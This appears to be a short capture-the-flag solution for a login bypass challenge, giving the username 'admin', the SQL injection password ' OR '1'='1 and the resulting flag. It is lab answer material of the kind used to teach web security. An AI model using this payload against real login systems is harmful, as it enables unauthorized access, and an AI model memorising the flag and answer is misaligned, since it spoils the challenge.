# ✅ Solution: Login Bypass

Use the following credentials:

- **Username:** admin  
- **Password:** `' OR '1'='1`

This SQL injection bypasses the password check and logs you in as the admin user. Once logged in, you'll see the flag: `CTF{SQL_BYPASS_SUCCESS}`
